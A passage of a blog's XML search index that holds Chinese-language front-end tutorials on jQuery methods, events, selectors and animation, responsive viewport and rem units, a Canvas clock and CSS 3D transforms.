$(this).css(&#123; width: function(index, value) &#123; return parseFloat(value) * 1.2; &#125;, height: function(index, value) &#123; return parseFloat(value) * 1.2; &#125; &#125;); &#125;); addClass()/removeClass addClass() 为每个匹配的元素添加指定的样式类名。值得注意的是这个方法不会替换一个样式类名。它只是简单的添加一个样式类名到元素上。 通常和 removeClass() 一起使用，用来切换元素的样式. 1$(&quot;p).addClass(&quot;firstClass secondClass&quot;).removeClass(&quot;thirdClass&quot;) 此外 addClass() 方法允许我们通过传递一个用来设置样式类名的函数。 123$(&quot;ul li:last&quot;).addClass(function(index) &#123; return &quot;item-&quot; + index;&#125;); toggleClass()toggleClass() 最简单的用法是为目标指定一个或多个样式，如果指定的样式存在（不存在）就删除（添加）一个类。 1$(&quot;p&quot;).click().toggleClass(&quot;myDiv&quot;)) 其它用法请参考官方文档。 0x04 DOM 内容 html()html() 读的时候获得的是目标元素的 HTML 源码。此时不接受任何参数。 html() 写的时候对 XML 文档无效。与 JavaScript 的 innerHTML() 方法相同，使用 html() 来设置元素的内容时，这些元素中的任何内容会完全被新的内容取代。 此外，html() 方法允许我们通过函数来传递HTML内容 123456789$(&quot;div&quot;).click(function()&#123; $(this).html(function()&#123; var countP = &quot;&quot; for(var i=0;i&lt;10;i++)&#123; countP += &quot;&lt;p&gt;hello,world&lt;/p&gt;&quot; &#125; return countP &#125;)&#125;) val()val() 主要用来获取表单元素的值,比如 input,checkbox,radio,text,textarea,select。 12$(&apos;input:checkbox:checked&apos;).val();$(&apos;input:radio[name=sex]:checked&apos;).val() 但是，当通过 val() 方法从 textarea 获得数据时，并不会包含回车符号(\r),只有通过 XHR 发送给服务器才会包含(\r)。 同样，当通过 val() 为某个表单元素设置值的时候允许使用一个函数来设置val()的值。 1$(&apos;input:text.items&apos;).val(funciton(&#123; return &apos;haha&apos;&#125;)) text()和 html() 方法不同， text() 在XML 和 HTML 文档中都能使用。text() 方法返回一个字符串，包含所有匹配元素的合并文本。 text() 方法不能使用在 input 元素或scripts元素上。 同样 text() 方法允许我们通过函数来传递文本内容。 attr()/removeAttr()需要弄清楚的是 Attributes 和 Property 的区别。prop() 方法返回 property 的值,而 attr() 方法返回 attributes 的值。 要检索和更改DOM属性,比如元素的 checked, selected, 或 disabled 状态，请使用.prop()方法。 removeAttr() 方法使用原生的 JavaScript removeAttribute() 函数,但是它的优点是可以直接在一个 jQuery 对象上调用该方法，并且它解决了跨浏览器的属性名不同的问题。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[jQuery(6)对象方法]]></title>
      <url>%2F2016%2F12%2F01%2FJQuery(6)%E6%96%B9%E6%B3%95%2F</url>
      <content type="text"><![CDATA[0x00 $.each()不同于 $(selector).each() 专门用来遍历一个 jQquery 对象, $.each() 函数要强大得多，它可以迭代任何集合，数组，类数组，jQuery对象，javascript 原生对象等。 迭代数组时，回调函数将会每次传递数组索引和对应的值作为参数 迭代对象时，回调函数将会每次传递一个键值对 1234567891011121314151617var arr = [&apos;one&apos;,&apos;two&apos;,&apos;three&apos;,&apos;four&apos;,&apos;five&apos;]var obj = &#123; &apos;one&apos;:1, &apos;two&apos;:2, &apos;three&apos;:3, &apos;four&apos;:4, &apos;five&apos;:5&#125;$.each(arr,function(i, val)&#123; $(&apos;#&apos; + val ).text(&quot;Mine is &quot;+ val +&apos;.&apos; ) return (val !== &apos;three&apos;)&#125;)$.each(obj, function(i,val)&#123; $(&apos;#&apos; + i).append( document.createTextNode(&apos;_&apos; + val))&#125;) $.each()返回false来终止迭代。返回非false相当于一个循环中的continue语句，这意味着，它会立即跳出当前的迭代，转到下一个迭代。 0x01 $.extend()将两个或更多对象的内容合并到第一个对象。但是第一个给位置的对象(即是被合并的目标对象)将会被修改，并且通过 $.extend() 返回，我们可以像下面一言保留第一个目标对象. 1var obj = $.extend(&#123;&#125;,object1,object2) 使用这种方式的情况是，如果第一个对象的属性本身是一个对象或数组，那么它将完全用第二个对象相同的key重写一个属性。这些值不会被合并。 12 此外，若设置了 deep 参数，即是 $.extend(true,obj1,ob2...) 的深层合并方法，那么在后续被嵌套的，对象和数组也会被合并进来，但是对象包裹的原始类型，比如String, Boolean, 和 Number是不会被合并进来的。 0x02 $.fn.extend()$.fn.extend() 会将一个对象的内容合并到jQuery的原型，以提供新的jQuery实例方法。 1234567$.fn.extend(&#123; check:function()&#123; alert(&quot;ahaa&quot;); &#125;&#125;)$(window).check()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[jQuery(7)Ajax]]></title>
      <url>%2F2016%2F12%2F01%2FjQuery(7)Ajax%2F</url>
      <content type="text"><![CDATA[0x00]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[jQuery(5)动画]]></title>
      <url>%2F2016%2F11%2F30%2FjQuery(5)%E5%8A%A8%E7%94%BB%2F</url>
      <content type="text"><![CDATA[0x00 基本方法 jQuery 中的所有特效方法都支持一个回调函数 hide(dura,easing,func)show(dura,easing,func)toggle(dura,easing,func)显示或隐藏匹配元素 slideDown(dura,easing,func)slideUp(dura,easing,func)用滑动动画隐藏一个匹配元素 slideToggle(dura,easing,func)用滑动动画显示或隐藏一个匹配元素。 fadeIn(dura,easing,func)通过淡入的方式显示匹配元素。 fadeOut(dura,easing,func)通过淡出的方式隐藏匹配元素。 fadeTo(dura,func)调整匹配元素的透明度。 fadeToggle(dura,easing,func)通过匹配的元素的不透明度动画，来显示或隐藏它们。 当被可见元素调用时，元素不透明度一旦达到0，display样式属性设置为none ，所以元素不再影响页面的布局。 animate()animate() 允许在任意的数字属性的 CSS上创建动画，所有用于动画的必需是数字属性的，这些属性如果不是数字的将不能使用基本的jQuery功能，(如：width,height,left 等样式属性以及scrollTop,scrollLeft) 一个简单的动画效果如下: 123456789$(&quot;button&quot;).on(&quot;click&quot;,function()&#123; $(&quot;#middle&quot;).animate(&#123; opacity:0.5, left:&apos;+=50&apos;, height:&apos;toggle&apos;, &#125;,1000,&quot;linear&quot;,function()&#123; $(&quot;#middle&quot;).css(&quot;left&quot;,&quot;-=50&quot;) &#125;)&#125;) 除了定义数值，每个属性能使用 show, hide, 和 而 toggle. 而 toggle 关键字必须在动画开始前给定属性值。 .animate() 默认的缓动函数是 swing，可以设置 linear动画。再多的动画效果便只有使用 jQuery Easing Plugin 插件了。 delay()设置一个延时来推迟执行队列中后续的项。 1$(&apos;#foo&apos;).slideUp(300).delay(800).fadeIn(400); stop(queue,clearQue,jumptoEnd)停止匹配元素当前正在运行的动画。 参数 queue 表示要停止动画队列的名称参数 clearQue 是一个布尔值，当一个元素拥有多个动画时表示是否在停止动画时清除队列中的所有的动画。参数 jumptoEnd 也是一个布尔值，当为 true 时，表示在停止动画后，该元素上的 CSS 属性会被立刻修改成动画的目标值，并且执行回调函数。 一个额外的方法 slideToggle(),会立刻从当前位置向反方向开始动画。 123$(&quot;#clickme&quot;).on(&quot;click&quot;,function()&#123; $(&quot;#middle&quot;).stop().slideToggle(1000)&#125;) finish().finish()方法和.stop(true, true)很相似，.stop(true, true)将清除队列，并且目前的动画跳转到其最终值。但是，不同的是，.finish() 会导致所有排队的动画的CSS属性跳转到他们的最终值。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[jQuery(2)事件]]></title>
      <url>%2F2016%2F11%2F28%2FjQuery(2)%E4%BA%8B%E4%BB%B6%2F</url>
      <content type="text"><![CDATA[0x00 ready不同于 JS load() 方法，jQuery 中的 ready() 在 DOM 准备就绪时就会触发，而不必等待整个页面都加载完成，这也是相比于 load() 更加高效的原因。 当 DOM 结构加载完成以后立即执行 12345678$(document).ready(functinon()&#123; //handler&#125;);// 以下是等价的$(function() &#123; // handler &#125;); 0x01 jQuery 事件绑定 on因为给种遗留的历史问题，性能，效率，规范统一等各种原因，从 jQuery1.7 开始，jQuery 就只有一种事件绑定器 .on() (推荐只用这个) 至于其它，比如.bind(),.live(),delegate() 可以参考官方文档 on().on()方法事件处理程序到当前选定的jQuery对象中的元素。在jQuery 1.7中，.on()方法 提供绑定事件处理的所有功能。 1.on( events [, selector ] [, data ], handler(eventObject) ) jQuery 使用 on() 绑定动态生成的元素时，不能直接用该对象操作，而是选择其非动态生成的父节点然后再找到本身才能达到效果(即事件委托)。 123456 // 写法$(&quot;body&quot;).on(&quot;click&quot;,&quot;#newdiv&quot;,function()&#123; alert(&quot;haha&quot;);&#125;)$(&quot;&lt;div&gt;&quot;).attr(&quot;id&quot;,&quot;newdiv&quot;).appendTo(&quot;body&quot;); 直接事件 和 委托事件在 jQuery 的事件处理程序器中(比如:bind(),delegate(),on()等等),如果省略Selector 或者参数为 null，那么事件处理程序被称为 直接事件 或者 直接绑定事件 。每次选中的元素触发事件时，就会执行处理程序，不管它直接绑定在元素上，还是从后代（内部）元素冒泡到该元素的。 当提供 Selector 参数时，事件处理程序是指为 委托事件（或者，代理事件,委派事件)。事件不会在直接绑定的元素上触发，只有当 Selector 参数选择器匹配到后代（内部元素）的时候，事件处理函数才会被触发。 事件冒泡简单的说就是，在冒泡路径上所有绑定了相同事件类型的元素上都会触发这些类型的事件. 事件委托是基于事件冒泡原理的实现的，它有2个好处，一是可以对后来加入的元素生效。二是大幅降低事件绑定的内存占用: 例如，在一个表格的 tbody 中含有 1,000 行，下面这个例子会为这 1,000 元素绑定事件： 123$(&quot;#dataTable tbody tr&quot;).on(&quot;click&quot;, function(event)&#123; alert($(this).text());&#125;); 委派事件的方法只有一个元素的事件处理程序，tbody，并且事件只会向上冒泡一层（从被点击的tr 到 tbody : 123$(&quot;#dataTable tbody&quot;).on(&quot;click&quot;, &quot;tr&quot;, function(event)&#123; alert($(this).text());&#125;); 阻止事件默认行为和事件冒泡我们可以调用 event.stopPropagation() 和 event.preventDefault() 来阻止事件冒泡或事件的默认行为。此外也可以有更简洁的方法，给 .on() 传递一个 false 参数就可以。 1$(&quot;a.disabled&quot;).on(&quot;click&quot;, false); 将会阻止所有含有 “disabled” 样式的链接的默认行为，并阻止该事件上的冒泡行为。 this当jQuery的调用处理程序时，this关键字指向的是当前正在执行事件的元素。对于直接事件而言，this 代表绑定事件的元素。对于代理事件而言，this 则代表了与 selector 相匹配的元素。(注意，如果事件是从后代元素冒泡上来的话，那么 this 就有可能不等于 event.target。)我们要使用 jQuey 的相关方法，那么最好创建一个 jQuery 的对象，即使用 $(this). 将数据传递给事件处理程序data 参数可以是任何类型，如果字符型，在必需提供 Selector 参数，或者明确的传递一 null。所以，做好将一个对象作为 data 参数。 12function greet(event) &#123; alert(&quot;Hello &quot;+event.data.name); &#125;$(&quot;button&quot;).on(&quot;click&quot;, &#123; name: &quot;Karl&quot; &#125;, greet); off()删除的通过 .on() 添加的事件处理程序，当是从性能和效率的考量，你最好不要使用诸如 off(), unbind() 等方法。 one()绑定一个事件，并且只运行一次，然后删除自己. toggleClass() 0x02 event.target 和 event.currentTarget通常情况下，我们可以认为 event.currentTarget 与 $(this) 是等价的，但是只是通常情况。 event.currentTarget: 事件绑定的元素 event.target:触发事件的元素 123456789101112131415161718192021&lt;body&gt;&lt;div id=&quot;grandPapa&quot;&gt;i&apos;am grandPapa &lt;div id=&quot;papa&quot;&gt; i&apos;am papa &lt;div id=&quot;son&quot;&gt; i&apos;am son &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;JS/js/jquery-1.11.1.min.js&quot; &gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;function handler(event)&#123; console.log($(event.target)) console.log($(event.currentTarget))&#125;$(&quot;#grandPapa&quot;).on(&apos;click&apos;,$(&apos;#son&apos;),handler)//[div#son, context: div#son]//[div#grandPapa, context: div#grandPapa]&lt;/script&gt; 此外，在没有冒泡的情况下.currentTarget 和 target 是一样的值。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[jQuery(1)选择器]]></title>
      <url>%2F2016%2F11%2F28%2FjQuery(1)%E9%80%89%E6%8B%A9%E5%99%A8%2F</url>
      <content type="text"><![CDATA[0x01 JQuery 选择器 基本选择器12345678// ID 选择器$(&quot;#item1&quot;).css(&#123;&#125;)// Class 选择器$(&quot;.items&quot;).css(&#123;&#125;)// * 选择器$(&quot;*div&quot;).css(&#123;&#125;) 层次选择器1234567891011121314// 组合层次选择器$(&apos;#item3,#item1&gt;span&apos;).css(&#123;&#125;)// 后代选择器$(&apos;#wrap #item1 span&apos;).css(&#123;&#125;)// 直接子代选取器$(&apos;#wrap&gt;div&apos;).css(&#123;&#125;)// 相邻兄弟选择器$(&apos;#item3 + div&apos;).css(&#123;&#125;)// 同胞兄弟选择器$(&apos;#item2 ~ div&apos;).css(&#123;&#125;) 过滤选择器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// :fisrt$(&apos;#wrap div:first&apos;).css(&#123;&#125;)// :last$(&apos;#wrap div:last&apos;).css(&#123;&#125;)// :not$(&apos;#wrap div:not&apos;).css(&#123;&#125;)// :even // 所匹配的集合中索引为偶素的项$(&quot;#wrap div:even&quot;).css(&#123;&#125;)// :odd// 所匹配的集合中索引为奇数的项$(&quot;#wrap div:odd&quot;).css(&#123;&#125;)// :eq// 指定索引的项$(&quot;.items:eq(1)&quot;).css(&#123;&#125;)// :gt 大于指定索引的项$(&quot;.items:gt(1)&quot;).css(&#123;&#125;)// :lt 小于指定索引的项$(&quot;.items:lt(3)&quot;).css(&#123;&#125;)// :nth-child(an+b)// 返回的集合中的第几项$(&quot;.items:nth-child(2n)&quot;).css(&#123;&#125;)// :nth-child(even/odd/index)/// 下标从 1 开始// :nth-of-type(2a+b)// :last-of-type()// :nth-last-of-type()// :only-of-type()// 选择所有没有兄弟元素，且具有相同的元素名称的元素。// 同理,还有// :first-child()// :last-child()// :only-child()// :empty-child()// :focus选择当前获得焦点的项// :animated// 正在执行动画的元素 属性过滤选择器同样，JQuery 支持 JS 中所有的属性选择器，此外，还支持组合式的属性选择器: 12345//选择指定属性值等于给定字符串或以该字符串为前缀的项$(&quot;div[class|=isDiv).css(&#123;&#125;)// 所有属性都符合的的匹配项 &amp;&amp; 的关系$(&quot;div[class^=items][diy]&quot;).css(&#123;&#125;) 内容过滤选择器1234567// 选择所有包含指定文本的所有元素:contains(text)// 选择选择元素其中至少包含指定选择器匹配的一个种元素。:has(selector)$(&apos;div:has(p)&apos;)// 所有含有 p 标签的 div 元素 表单选择器]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[viewport ,media, rem]]></title>
      <url>%2F2016%2F11%2F22%2F%E5%93%8D%E5%BA%94%E5%BC%8F%E7%AC%AC%E4%B8%80%E7%AF%87%E7%AB%A0-viewport%EF%BC%8Cmedia%2Crem%2F</url>
      <content type="text"><![CDATA[0x00 viewport通俗的讲，移动设备上的viewport就是设备的屏幕上能用来显示我们的网页的那一块区域，但实际情况下并不总是这样。 移动设备的屏幕尺寸比 PC 端的屏幕尺寸要小得多，所以，移动端的浏览器为了能让那些在 PC 端开发的网站被正常的显示，决定默认情况下把 viewport 设为一个较宽的值，我们暂且把这个浏览器默认的 viewport 叫做 layout viewport,这个 layout viewport 的宽度可以通过 document.documentElement.clientWidth 来获取(iphone6的 layout viewport 值为 980 px)。 此外，还需要一个 viewport 来代表浏览器可视区域的大小，我们这个 viewport 称为 **visual viewport,可以通过window.innerWidth` 来获取它的宽度值. 最后，还有一个能够完美适配移动端设备的 viewport 。所谓的完美适配指的是，首先不需要用户缩放和横向滚动条就能正常的查看网站的所有内容；第二，显示的文字的大小是合适，比如一段14px大小的文字，不会因为在一个高密度像素的屏幕里显示得太小而无法看清，理想的情况是这段14px的文字无论是在何种密度屏幕，何种分辨率下，显示出来的大小都是差不多的。我们把这个 viewport 叫做 ideal viewport，即是 理想 viewport，ideal viewport 的宽度等于移动设备的屏幕宽度。 ideal viewport 并没有一个固定的尺寸，不同的设备拥有有不同的 ideal viewport,目前，iphone6的 ideal viewport 宽度值是 375px。 0x01 meta 媒体查询我们可以通过 meta 标签对移动设备的 viewport (移动设备默认的是 layout viewport)，进行控制。 1&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0,maximum-scale=2.0,minimum-scale=0.5,user-scalable=yes&quot;/&gt; 对 meta viewport content 中的属性解释如下: width : 设置 layout viewport 的宽度，该值为一个正整数，当设置为字符串 width-device 时，意味着将浏览器的 viewport 设置为 ideal viewport。 initial-scale :设置页面的初始缩放值 minimum-scale :用户所能进行的最小缩放值 maximum-scale :用户所能进行的最大缩放值 user-scalable :是否允许用户进行缩放，值为 yes 或 no 这些属性可以同时使用，也可以单独使用或混合使用，多个属性同时使用时用逗号隔开。 此外，缩放是相对于 ideal viewport 来缩放的，缩放值越大，当前viewport 的宽度就会越小，反之亦然。 CSS3 加入的媒体查询使得无需修改内容便可以使样式应用于某些特定的设备范围。 在 link 元素中应用媒体查询: 1&lt;link href=&quot;example.css&quot; rel=&quot;stylesheet&quot; media=&quot;(max-width:800px) and (min-width:375px) &quot;&gt; max-width :当媒体可视区域的宽不大于该值时应用 example.css 样式 min-width: 当媒体可视区域的宽不小于该值时应用 example.css 样式 在 CSS 样式中使用媒体查询: 12345678&lt;style type=&quot;text/css&quot;&gt; @media screen and (max-width: 800px) and (min-width: 375px)&#123; /*style*/ *&#123; background: red; &#125; &#125;&lt;/style&gt; 这个查询适用于宽度在 375px 和 800px之间的屏幕 screen 。与此类似的媒体类型 tv 代表电视, handheld 代表手持设备,print 代表打印机。 其中， and 属于逻辑操作符合，此外，还有 not, only, or 等逻辑操作符， 并且 or 操作符和 逗号(,) 操作符的作用一样。 比如，想在最小宽度为700像素或是横屏的手持设备上应用一组样式: 12@media (min-width: 700px), handheld and (orientation: landscape) &#123; ... &#125;// (orientation: portrait) 表示竖屏设备 媒体查询要写在 所有的 CSS 样式的最后 0x02 rem当在进行移动设备的布局时，我们将会经常使用的一个单位是 rem,而不再是 px rem, emrem 与 em 的参考对象都是 font-size 这个属性的值，不过 em 的参考对象是父级的 font-size 值，而 rem 的参考对象是根元素 &lt;html&gt; 元素的 font-size 值。 1em = 父级 font-size 大小，1rem = 根元素 font-size 大小 如果html5要适应各种分辨率的移动设备，应该使用rem这样的尺寸单位,下面是各个分辨率范围在 html上 设置 font-size 的代码： 12345678html&#123;font-size:10px&#125; @media screen and (min-width:321px) and (max-width:375px)&#123;html&#123;font-size:11px&#125;&#125; @media screen and (min-width:376px) and (max-width:414px)&#123;html&#123;font-size:12px&#125;&#125; @media screen and (min-width:415px) and (max-width:639px)&#123;html&#123;font-size:15px&#125;&#125; @media screen and (min-width:640px) and (max-width:719px)&#123;html&#123;font-size:20px&#125;&#125; @media screen and (min-width:720px) and (max-width:749px)&#123;html&#123;font-size:22.5px&#125;&#125; @media screen and (min-width:750px) and (max-width:799px)&#123;html&#123;font-size:23.5px&#125;&#125; @media screen and (min-width:800px)&#123;html&#123;font-size:25px&#125;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Canvas绘画一个时钟]]></title>
      <url>%2F2016%2F11%2F21%2FCanvas%E7%BB%98%E7%94%BB%E4%B8%80%E4%B8%AA%E6%97%B6%E9%92%9F%2F</url>
      <content type="text"><![CDATA[0x01 时钟样式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt; &lt;title&gt;Examples&lt;/title&gt; &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt; &lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt; &lt;link href=&quot;&quot; rel=&quot;stylesheet&quot;&gt; &lt;style type=&quot;text/css&quot;&gt; *&#123; margin: 0; padding: 0; overflow: hidden; &#125; #myCanvas&#123; background: black; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;canvas id=&quot;myCanvas&quot; width=&quot;2000&quot; height=&quot;1000&quot;&gt;&lt;/canvas&gt;&lt;/body&gt;&lt;script type=&quot;text/javascript&quot;&gt; setInterval(clock1,1000) // 每隔一秒调用一次 clock 函数 function clock1()&#123; var drawing = document.querySelector(&quot;#myCanvas&quot;) var context = drawing.getContext(&quot;2d&quot;) context.save() //保存最原始的画布状态，如此便不需要 clearRect()清除整个画布 context.translate(500,350) //新的画布状态，将圆心移到原始画布状态的(500,350)处 context.rotate(Math.PI/180*180) // 将整个坐标系选择 180 deg，方便显示之后的时间数字，以保证 12 在顶部 // Start drawing clock shape(即是十二边形) var r= 200 // 定义表盘半径 context.save() // 保存当前状态（即是 &quot;第一个状态&quot;[将上一个状态记为第一个状态]） var radGrad = context.createRadialGradient(0,0,10,0,0,70) // 添加表盘渐变范围 radGrad.addColorStop(0.4,&quot;black&quot;) radGrad.addColorStop(0.2,&quot;deeppink&quot;) // 添加渐变颜色 context.fillStyle = radGrad; // 在 fillStyle 中应用渐变颜色 context.strokeStyle = &quot;deeppink&quot; // 描边颜色 context.lineWidth =&quot;1&quot; // 线条宽度 context.beginPath() // 开始绘画 moveTo(0,0) // 从圆心开始 for(var i=0;i&lt;12;i++)&#123; context.rotate(Math.PI/180*30) // 每次旋转坐标系 30 deg context.lineTo(0,r) // 在 y 轴上描点 &#125; context.closePath() // 闭合路劲 context.stroke() // 描边 context.fill() // 填充 context.restore() // 恢复上一个状态(恢复以后当前画布状态 “第一个状态”) // End clock shape //Start hours masks context.save() // 保存当前状态(&quot;第一个状态&quot;) context.strokeStyle = &quot;deeppink&quot; context.fillStyle = &quot;deeppink&quot; for(var j=0;j&lt;12;j++)&#123; context.beginPath() context.rotate(Math.PI/180*30) context.moveTo(0,r) context.lineTo(0,r-10); // hour masks // context.closePath() 绘制直线的时候不需要闭合路径，切记！ context.stroke() // 描边 &#125; context.restore() //恢复上一个状态(恢复以后当前画布状态 “第一个状态”) //End hours masks // 设置数字格式 context.save() // 保存当前状态(&quot;第一个状态&quot;) context.strokeStyle = &quot;deeppink&quot; context.fillStyle = &quot;deeppink&quot; context.lineWidth = &quot;1&quot; context.font = &quot;20px 宋体&quot; context.textAlign = &quot;center&quot; context.textBaseline = &quot;middle&quot; for(var k=0;k&lt;12;k++)&#123; context.rotate(Math.PI/180*30) context.fillText(k+1,0,r-20) // 添加数字 &#125; context.restore() //恢复上一个状态(恢复以后当前画布状态 “第一个状态”) // Start minutes masks context.save() // 保存当前状态(&quot;第一个状态&quot;) context.strokeStyle = &quot;deeppink&quot; for(var k=0;k&lt;60;k++)&#123; if(k%5 !=0)&#123; context.beginPath() context.moveTo(0,r-5) context.lineTo(0,r-10) context.stroke() &#125; context.rotate(Math.PI/180*6) &#125; context.restore() //恢复上一个状态(恢复以后当前画布状态 “第一个状态”) var date = new Date() var hour = date.getHours() var minute = date.getMinutes() var seconds = date.getSeconds() hour = hour&gt;12?hour-12:hour // write hours context.save() // 保存当前状态(&quot;第一个状态&quot;) context.strokeStyle = &quot;deeppink&quot; context.lineWidth =&quot;4&quot; context.beginPath() context.rotate(Math.PI/180*(360/12*hour)+Math.PI/180*(30*(minute/60))+Math.PI/180*(360/12*(seconds/3600))) context.moveTo(0,0) context.lineTo(0,130) context.stroke() context.restore() //恢复上一个状态(恢复以后当前画布状态 “第一个状态”) // write minute //保存当前状态(&quot;第一个状态&quot;) context.save() context.strokeStyle = &quot;deeppink&quot; context.width = &quot;3&quot; context.beginPath() context.rotate(Math.PI/180*(6*minute)+Math.PI/180*(6*(seconds/60))) context.moveTo(0,0) context.lineTo(0,170) context.stroke() context.restore() //恢复上一个状态(恢复以后当前画布状态 “第一个状态”) // write seconds context.save() //保存当前状态(&quot;第一个状态&quot;) context.strokeStyle = &quot;deeppink&quot; context.width = &quot;&quot; context.beginPath() context.rotate(Math.PI/180*(6*seconds)) context.moveTo(0,0) context.lineTo(0,180) context.stroke() context.restore() //恢复上一个状态(恢复以后当前画布状态 “第一个状态”) context.restore() // 恢复到原始状态 &#125;&lt;/script&gt;&lt;/html&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CSS 3D]]></title>
      <url>%2F2016%2F11%2F14%2FCSS3D%2F</url>
      <content type="text"><![CDATA[0x00 transform 2D我们先来看看在二维坐标系中的 transform 的作用效果。 transform 可以让元素进行移动translate,旋转rotate,缩放scale,倾斜skew。 2D 中的旋转角为正时,将会沿顺时针旋转。 旋转1transform:rotate(50deg) 缩放1transform:scale(xNum,yNum) 倾斜123transform:skewX(angle)transform:skewY(angel)trasnform:skew(xangle,yangle) 平移1transform:tanslate(x,y) 0x01 CSS 3D 关于坐标系传说从初中到高中到大学的课堂上，教材中所涉及的立体几何基本都是右手系。关于左手系与右手系的关系，见下图。 规定在右手坐标系中，物体旋转的正方向是右手螺旋方向，即**从该轴正半轴向原点看是顺时针方向(记住这点很重要，不然在之后的 CSS 3D 旋转属性中，你的世界会有种眩晕感，然后你的坐标系开始紊乱，然后你的宇宙就崩溃了。。。) OK,我们借坐标系短暂回忆了下我们的青春，现在我们来看看值移动设备或PC中的坐标系是如何建立的，同样见下图，一目了然。 在移动设备和电脑中 Y 轴是向下的。 0x02 transform 3D 属性transform-origintransform-origin 可以改变元素是旋转中心的位置。默认情况下，元素即绕三维物体会绕着自身的中心点旋转。rotate() 默认的旋转中心是(50%,50%)。 CSS3变形属性中旋转、缩放、倾斜都可以通过 transform-origin 属性重置元素的原点，但其中的位移 translate() 始终以元素中心点进行位移。 persective需要知道的是，在设计 3D 效果时: 只能选择透视方式，也就是近大远小的显示方式。 镜头方向只能是平行Z轴向屏幕内，也就是从屏幕正前方向里看。 初始状态下，所有元素都是放置在z=0的平面上。 perspective 属性让元素拥有了视野和视角的效果，而不是像以往的贴在屏幕上的平面，模拟了眼睛与物体之前的距离带来的远近视差效果。 通过 perspective(透视) 属性， 可以设置镜头到元素所在平面的距离，它会让东西看起来近处的大，远处的小。以此，从视觉上产生不同程度的3D效果。其默认值是设备的屏幕分辨率。所以不同设备的 perspective 默认值是不一样的。 设置 perserspective 有两种方式， 123transform: perspective( 400px );/**或者**/perspective: 400px; 这两种写法，都触发了元素的3D行为，函数型的写法transform:perspective(400px) 适用于单个元素，会对每一个元素做3D视图的变换，而perspective:400px 的写法，需写在父元素上。 所以，perspective 并不影响当前元素的渲染，而是影响它的所有子元素。这也是它跟transform:perspective()方法的主要区别。 在 WebKit 浏览器里，使用 perspective 只要是它的祖先元素都行，但在火狐或IE里只能是直接父元素。 此外,perspective-origin 属性规定了镜头在平面上的位置。镜头的默认位置是 对着 元素的中心点的。 backface-visibilitybackface-visibility 属性可用于隐藏内容的背面。 transform-styletransform-style 属性是3D空间一个非常重要的属性，指定嵌套元素如何在3D空间中呈现。他主要有两个属性值：flat 和 preserve-3d。 其中 flat 值为默认值，表示所有子元素都在2D平面呈现。而 preserve-3d 表示所有子元素在3D空间中呈现。 当对 舞台元素 (变形元素们的共同直接父元素)使用 transform-style:perserve-3d 时，便是为其中的所有的子元素声明了一个 3D 渲染空间，这样处于其中的子元素便会以 3D 的形态展现出来。 transform-style 属性是非继承的，即只对其直接子元素提供 3D 渲染空间，对于中间节点需要显式设定。 **如果需要使用 3D 模式，必须先为其直接父元素指定 transform-style:perserve-3d，并在任意祖先元素(包括直接父级元素)上增加 perspective 属性，有必要的好最好一并添加 perspective-origin 来指定透视点。 0x03 绘制 3D 图像 正方体123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt;&lt;title&gt;Cubes&lt;/title&gt;&lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;&lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;&lt;link href=&quot;&quot; rel=&quot;stylesheet&quot;&gt;&lt;style type=&quot;text/css&quot;&gt; html,body&#123; perspective-origin: 50% 50%; perspective:1000px; height: 100%; width: 100%; background: #444; &#125; .cube &#123; position: fixed; top:25%; left: 50%; width: 200px; height: 200px; margin-left: -100px; &#125; .container-3D&#123; transform: rotateX(0deg) rotateY(0deg) rotateZ(0deg); transform-style: preserve-3d; animation: rotation 10s linear infinite; &#125; @-webkit-keyframes rotation &#123; from&#123; transform: rotateY(0deg) rotateX(-180deg) rotateZ(-140deg); &#125;50%&#123; transform: rotateY(360deg) rotateX(-360deg) rotateZ(0deg); &#125;to&#123; transform: rotateY(360deg) rotateX(180deg) rotateZ(220deg); &#125; &#125; @-webkit-keyframes plus&#123; from&#123; width: 200px; height: 200px;background-color: #B00;border-width: 1px;border-color: #000;border-radius: 0px; &#125; 20%&#123; width: 200px; height: 200px;background-color: deeppink;border-width: 10px;border-color:#333;border-radius: 15px; &#125; 40%&#123; width: 100px; height: 100px;background-color: yellowgreen;border-width: 12px;border-color: #444;border-radius: 20px; &#125; 60%&#123; width: 100px; height: 100px; background-color: #B00; border-width: 30px;border-color: #fff;border-radius: 50px&#125; 80%&#123; width: 180px; height: 180px; background-color: #0B0; border-width: 10px;border-color: #000; border-radius: 0px &#125; to&#123; width: 200px; height: 200px;background-color: #333;border-width: 1px;border-color: #123;border-radius: 10px; &#125; &#125; .face&#123; background: rgba(200,200,200,1); width: 200px; height: 200px; position: absolute; border:1px solid black; transform-style: preserve-3d; animation: plus 5s ease-in-out infinite alternate; &#125; .face--front&#123; transform: translateZ(100px); &#125; .face--back&#123; transform: translateZ(-100px); &#125; 